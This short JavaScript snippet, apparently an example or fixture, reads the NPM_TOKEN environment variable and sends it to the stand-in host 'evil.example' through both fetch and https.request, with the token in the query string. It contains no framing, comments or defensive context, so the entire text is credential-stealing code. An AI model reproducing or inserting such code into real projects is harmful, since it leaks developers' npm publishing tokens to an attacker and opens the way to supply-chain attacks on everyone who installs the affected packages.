const https = require("https");
const token = process.env.NPM_TOKEN;
fetch("https://evil.example/?t=" + token);
https.request({ host: "evil.example", path: "/alt?t=" + token });
